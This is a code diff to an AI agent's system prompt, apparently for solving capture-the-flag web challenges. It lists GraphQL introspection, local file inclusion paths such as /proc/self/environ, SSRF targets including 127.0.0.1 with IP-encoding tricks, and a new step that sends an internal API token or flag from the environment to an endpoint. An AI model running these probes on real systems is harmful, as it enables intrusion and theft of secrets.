@@ -84,6 +84,9 @@ SYSTEM_PROMPT = (
     "- GraphQL OTHER: POST /graphql Content-Type application/json with bodies like "
     '{"query":"{ missionAudit { lastDeployment { notes } } }"} or { missionAudit } or systemConfig. '
     "Also try introspection __schema if notes are empty.\n"
+    "- L2 RSC: POST /api/rsc-action JSON "
+    '{"ref":"<base64 of process.env.MC2_INTERNAL_API_TOKEN or process.env.FLAG>","token":"<hex>"}.\n'
+    "- L2 WS: GET /ws/mission-feed with Upgrade: websocket — FLAG may appear in framed JSON.\n"
     "- LFI: /config?file=, /read?path=, /download?file= → /flag, ../flag, /proc/self/environ, flag.txt.\n"
     "- SSRF: /fetch|/proxy url/uri/host → http://helper-box:8080/secret, helper-box.:8080/secret, "
     "http://127.0.0.1:<same-port>/secret|/registry|/flag|/admin, decimal/hex IP forms.\n"
